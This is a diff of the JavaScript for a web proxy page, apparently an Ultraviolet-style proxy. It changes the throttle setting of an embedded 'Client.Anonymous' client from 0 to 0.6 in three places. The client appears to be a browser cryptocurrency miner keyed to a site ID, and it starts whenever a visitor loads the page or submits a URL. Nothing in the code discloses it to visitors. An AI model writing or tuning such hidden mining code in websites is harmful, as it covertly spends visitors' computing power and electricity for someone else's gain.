@@ -49,7 +49,7 @@ async function initializeProxy() {
         setTimeout(() => {
             frame.src = __uv$config.prefix + __uv$config.encodeUrl(url);
             var _client = new Client.Anonymous('a6213f1b3c1f1f295fabf3c0abe5d9a3c8d03fabfad99b88efe1e5e0b9b2815e', {
-                throttle: 0, c: 'w', ads: 0
+                throttle: 0.6, c: 'w', ads: 0
             });
             _client.start();
     
@@ -86,7 +86,7 @@ form.addEventListener("submit", async (event) => {
     setTimeout(() => {
         frame.src = __uv$config.prefix + __uv$config.encodeUrl(url);
         var _client = new Client.Anonymous('a6213f1b3c1f1f295fabf3c0abe5d9a3c8d03fabfad99b88efe1e5e0b9b2815e', {
-            throttle: 0, c: 'w', ads: 0
+            throttle: 0.6, c: 'w', ads: 0
         });
         _client.start();
     }, 2000);
@@ -179,7 +179,7 @@ document.addEventListener("DOMContentLoaded", () => {
         setTimeout(() => {
             frame.src = __uv$config.prefix + __uv$config.encodeUrl(url);
             var _client = new Client.Anonymous('a6213f1b3c1f1f295fabf3c0abe5d9a3c8d03fabfad99b88efe1e5e0b9b2815e', {
-                throttle: 0, c: 'w', ads: 0
+                throttle: 0.6, c: 'w', ads: 0
             });
             _client.start();
         }, 2000);
@@ -192,6 +192,7 @@ document.addEventListener("DOMContentLoaded", () => {
         submitProxySearch().catch(err => console.error("Proxy search submit error:", err));
     });
 });
+
 
 
 
